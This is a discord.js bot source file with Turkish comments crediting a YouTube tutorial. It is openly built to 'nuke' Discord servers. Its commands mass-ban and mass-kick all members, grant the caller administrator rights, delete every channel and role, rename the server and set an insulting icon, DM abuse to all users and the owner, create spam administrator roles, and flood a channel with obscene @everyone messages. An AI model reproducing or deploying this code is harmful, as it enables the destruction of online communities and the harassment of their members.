const Discord = require("discord.js"); //TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryoutube KANALINDA VİDEOLU ANLATIMI BULUNMAKTADIR
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+duyur") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**BOKTAN SUNUCUYDU** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll();      //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("xd", {
      type: "text"
    });
      await msg.guild
      .createChannel("SİKTİK", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("31"); // sj
      });

    await msg.guild.setIcon("https://i.resmim.net/Z2LWl.jpg");  //SUNUCUNUN RESMINI https://i.resmim.net/Z2LWl.jpg / https://i.resmim.net/Zga3y.png 
    await msg.guild.setName("Yarrk Kafalılar"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://i.resmim.net/Z2LWl.jpg"); //https://i.resmim.net/zCZ2R.png
    await client.user.setUsername("ben siktim");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**noldu lan nası siktik**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
});

 //www.youtube.com/enesacaryoutube TARAFINDAN YAPILMISTIR

    client.on("message", msg => {
  if (msg.content === "+rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "siktim",
      color: "A599FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "siktim",
      color: "A599FF",
      permissions: ["ADMINISTRATOR"]
    });

             msg.guild.createRole({
      name: "siktim",
      color: "A599FF",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:');  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:');   ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
        msg.channel.send('**__BU SUNUCUYU SİKTİM KOLAYDINIZ xD__** @everyone :wink: :heart:'); 
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);


//TÜM TELİF HAKKI ENES ACARA AİTTİR youtube.com/enesacaryoutube VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0